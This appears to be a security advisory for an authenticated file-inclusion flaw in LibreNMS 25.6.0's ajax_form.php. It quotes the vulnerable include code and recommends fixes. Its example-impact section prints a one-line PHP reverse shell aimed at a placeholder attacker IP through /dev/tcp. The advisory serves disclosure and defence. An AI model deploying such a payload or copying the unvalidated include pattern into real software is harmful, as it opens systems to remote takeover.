summary: "LibreNMS has Authenticated Remote File Inclusion in ajax_form.php that Allows RCE\n\
  LibreNMS 25.6.0 contains an architectural vulnerability in the `ajax_form.php` endpoint that\
  \ permits Remote File Inclusion based on user-controlled POST input. \n\nThe application directly\
  \ uses the `type` parameter to dynamically include `.inc.php` files from the trusted path\
  \ `includes/html/forms/`, without validation or allowlisting:\n\n```php\nif (file_exists('includes/html/forms/'\
  \ . $_POST['type'] . '.inc.php')) {\n    include_once 'includes/html/forms/' . $_POST['type']\
  \ . '.inc.php';\n}\n```\nThis pattern introduces a latent Remote Code Execution (RCE) vector\
  \ if an attacker can stage a file in this include path — for example, via symlink, development\
  \ misconfiguration, or chained vulnerabilities.\n\n>  This is not an arbitrary file upload\
  \ bug. But it does provide a powerful execution sink for attackers with write access (direct\
  \ or indirect) to the include directory.\n\n# Conditions for Exploitation\n\n- Attacker must\
  \ be authenticated    \n- Attacker must control a file at `includes/html/forms/{type}.inc.php`\
  \ (or symlink)        \n\n# Example Impact (RCE)\n\nIf a PHP file or symlinked shell is staged\
  \ in the include path, an attacker can achieve full remote code execution under the `librenms`\
  \ user context:\n\n```php\n<?php system('/bin/bash -c \"bash -i >& /dev/tcp/ATTACKER-IP/4444\
  \ 0>&1\"'); ?>\n```\nhttps://github.com/user-attachments/assets/deb9ccd2-101c-4172-89b1-b840b7ed3812\n\
  \n\n---\n\n# Recommended Fix\n\n- Implement strict allow listing or hardcoded routing instead\
  \ of dynamically including user-supplied filenames. \n- Avoid passing raw POST input into\
  \ `include_once`.\n- Ensure the inclusion path is immutable and outside attacker control (e.g.,\
  \ avoid variable expansion into trusted paths)."
